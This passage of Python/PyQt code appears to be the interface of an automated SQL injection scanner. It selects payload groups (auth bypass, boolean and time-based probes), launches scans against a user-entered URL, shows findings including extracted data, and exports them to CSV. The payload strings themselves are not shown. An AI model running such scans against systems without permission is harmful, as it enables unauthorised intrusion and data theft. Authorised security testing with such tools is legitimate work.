            total = sum(len(d["payloads"]) for d in ADVANCED_GROUPS.values())
            self.mode_title.setText("Advanced — Deep Probe")
            self.mode_desc.setText(
                f"{total} payloads across {len(ADVANCED_GROUPS)} categories.\n"
                "Select groups below. Covers all major DB engines."
            )
            self.launch_btn.setText("Launch Advanced Scan")
        else:
            self.basic_btn.setStyleSheet(active)
            self.advanced_btn.setStyleSheet(inactive)
            self.adv_frame.hide()
            self.mode_title.setText("Basic — Quick Probe")
            self.mode_desc.setText(
                f"{len(BASIC_PAYLOADS)} payloads — error triggers, auth bypass,\n"
                "boolean probes, polyglot time-based.\n"
                "Completes in under 60 seconds."
            )
            self.launch_btn.setText("Launch Scan")

    # ─────────────────────────────────────────────────────────────────────────
    # Launch / Stop
    # ─────────────────────────────────────────────────────────────────────────

    def _get_payloads(self):
        if self._mode == "basic":
            return list(BASIC_PAYLOADS)
        jobs = []
        for name, data in ADVANCED_GROUPS.items():
            cb = self.group_checks.get(name)
            if cb and cb.isChecked():
                for payload, label in data["payloads"]:
                    jobs.append({"payload": payload, "label": label, "tags": name})
        return jobs

    def _launch(self):
        url = self.url_input.text().strip()
        if not url:
            self.status_lbl.setText("Enter a URL first.")
            return
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
            self.url_input.setText(url)

        payloads = self._get_payloads()
        if not payloads:
            self.status_lbl.setText("No payload groups selected.")
            return

        self._results = []
        self.table.setRowCount(0)
        self.preview.clear()
        self.log_box.clear()
        self._reset_chips()
        self.flagged_badge.setText("")

        config = {
            "url":         url,
            "crawl_depth": self.opt_depth.value(),
            "timeout":     self.opt_timeout.value(),
            "time_flag":   self.opt_timeflag.value(),
            "delay":       self.opt_delay.value(),
        }

        self.launch_btn.hide()
        self.stop_btn.show()
        self.progress.setValue(0)
        self.progress.show()
        self.status_lbl.setText(f"Starting scan on {url} ...")

        self._worker = AutoScanWorker(config, payloads)
        self._worker.log_signal.connect(self._on_log)
        self._worker.result_signal.connect(self._on_result)
        self._worker.progress_signal.connect(self._on_progress)
        self._worker.done_signal.connect(self._on_done)
        self._worker.start()

    def _stop(self):
        if self._worker:
            self._worker.stop()
            self._worker.terminate()
        self._finish()
        self.status_lbl.setText("Scan stopped.")

    def _finish(self):
        self.launch_btn.show()
        self.stop_btn.hide()
        self.progress.hide()

    # ─────────────────────────────────────────────────────────────────────────
    # Signals
    # ─────────────────────────────────────────────────────────────────────────

    def _on_log(self, msg, level):
        cols = {"info": C_MUTED, "success": C_SUCCESS, "warning": C_WARNING, "error": C_DANGER}
        color = cols.get(level, C_MUTED)
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_box.append(
            f'<span style="color:{C_DIMMED}">[{ts}]</span> '
            f'<span style="color:{color}">{msg}</span>'
        )
        sb = self.log_box.verticalScrollBar()
        sb.setValue(sb.maximum())

    def _on_result(self, result):
        self._results.append(result)
        row = self.table.rowCount()
        self.table.insertRow(row)
        self.table.setRowHeight(row, 36)
        bg = QColor("#3D1F1F")

        def cell(text, color=C_TEXT, align=Qt.AlignLeft | Qt.AlignVCenter):
            item = QTableWidgetItem(str(text))
            item.setForeground(QColor(color))
            item.setBackground(bg)
            item.setTextAlignment(align)
            return item

        parsed = urlparse(result["endpoint"])
        short  = parsed.path.rstrip("/").split("/")[-1] or parsed.netloc

        status = result.get("status", "?")
        s_col  = C_SUCCESS if status == 200 else (C_DANGER if str(status) in ("500","ERROR","TIMEOUT") else C_WARNING)
        t      = result.get("time", 0)
        t_col  = C_DANGER if t >= self.opt_timeflag.value() else C_TEXT
        flags  = "  ·  ".join(result.get("flags", []))

        self.table.setItem(row, 0, cell(short, C_MUTED))
        self.table.setItem(row, 1, cell(result["param"], C_ACCENT))
        self.table.setItem(row, 2, cell(result["payload"]))
        self.table.setItem(row, 3, cell(result.get("tags", ""), C_DIMMED))
        self.table.setItem(row, 4, cell(status, s_col, Qt.AlignCenter | Qt.AlignVCenter))
        self.table.setItem(row, 5, cell(f"{t:.2f}", t_col, Qt.AlignRight | Qt.AlignVCenter))
        # Show extracted data in findings column if present
        findings = flags
        if result.get("extracted"):
            for k, v in result["extracted"].items():
                findings += f"  ·  {k}: {v}"
        self.table.setItem(row, 6, cell(findings, C_DANGER))
        self.table.scrollToBottom()

        count = len(self._results)
        self.chip_flagged._val.setText(str(count))
        self.flagged_badge.setText(f"[!]  {count} finding{'s' if count != 1 else ''}")

    def _on_progress(self, current, total, phase):
        self.progress.setValue(int((current / total) * 100) if total else 0)
        self.status_lbl.setText(f"{phase}  ({current} / {total})")
        self.chip_tested._val.setText(str(current))

    def _on_done(self, results):
        self._finish()
        flagged = len([r for r in results if r.get("flagged")])
        total   = len(results)
        clean   = total - flagged
        self.chip_tested._val.setText(str(total))
        self.chip_flagged._val.setText(str(flagged))
        self.chip_clean._val.setText(str(clean))
        if flagged:
            self.status_lbl.setText(
                f"Done — {total} tests, {flagged} potential vulnerabilities found. Check the Findings table."
            )
        else:
            self.status_lbl.setText(
                f"Done — {total} tests, no obvious vulnerabilities detected."
            )

    def _on_row_selected(self):
        row = self.table.currentRow()
        if 0 <= row < len(self._results):
            snippet = self._results[row].get("snippet", "")
            self.preview.setPlainText(snippet or "(no response body)")

    # ─────────────────────────────────────────────────────────────────────────
    # Helpers
    # ─────────────────────────────────────────────────────────────────────────

    def _chip(self, label, value, color) -> QFrame:
        f = QFrame()
        f.setStyleSheet(f"background: {C_CARD}; border: 1px solid {C_BORDER}; border-radius: 8px;")
        f.setFixedSize(108, 52)
        lay = QVBoxLayout(f)
        lay.setContentsMargins(11, 7, 11, 7)
        lay.setSpacing(1)
        v = QLabel(value)
        v.setStyleSheet(f"font-size: 20px; font-weight: 700; color: {color}; background: transparent;")
        l = QLabel(label)
        l.setStyleSheet(f"font-size: 10px; color: {C_DIMMED}; font-weight: 600; background: transparent;")
        lay.addWidget(v)
        lay.addWidget(l)
        f._val = v
        return f

    def _reset_chips(self):
        for c in [self.chip_tested, self.chip_flagged,
                  self.chip_endpoints, self.chip_clean]:
            c._val.setText("—")

    def _clear(self):
        self._results = []
        self.table.setRowCount(0)
        self.preview.clear()
        self.log_box.clear()
        self._reset_chips()
        self.flagged_badge.setText("")
        self.status_lbl.setText("Cleared.")

    def _export(self):
        if not self._results:
            return
        path, _ = QFileDialog.getSaveFileName(
            self, "Export", "quicklaunch_results.csv", "CSV Files (*.csv)"
        )
        if not path:
            return
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write("endpoint,method,parameter,payload,label,tags,status,time_s,flagged,findings\n")
                for r in self._results:
                    findings = " | ".join(r.get("flags", []))
                    f.write(
                        f'"{r["endpoint"]}","{r["method"]}","{r["param"]}",'
                        f'"{r["payload"].replace(chr(34), chr(39))}",'
                        f'"{r["label"]}","{r["tags"]}",'
                        f'{r["status"]},{r["time"]},{r["flagged"]},"{findings}"\n'
                    )
        except Exception as e:
            print(f"Export error: {e}")

    def _mode_btn(self, label, active) -> QPushButton:
        btn = QPushButton(label)
        if active:
            btn.setStyleSheet(f"QPushButton {{ background: {C_ACCENT}; color: white; border: none; border-radius: 7px; padding: 8px 14px; font-size: 13px; font-weight: 700; }}")
        else:
            btn.setStyleSheet(f"QPushButton {{ background: {C_CARD}; color: {C_MUTED}; border: 1px solid {C_BORDER}; border-radius: 7px; padding: 8px 14px; font-size: 13px; }} QPushButton:hover {{ border-color: {C_ACCENT}; color: {C_TEXT}; }}")
        return btn

    def _mini(self):
        return f"QPushButton {{ background: {C_HOVER}; color: {C_MUTED}; border: 1px solid {C_BORDER}; border-radius: 6px; padding: 5px 12px; font-size: 11px; }} QPushButton:hover {{ background: {C_CARD}; color: {C_ACCENT}; border-color: {C_ACCENT}; }}"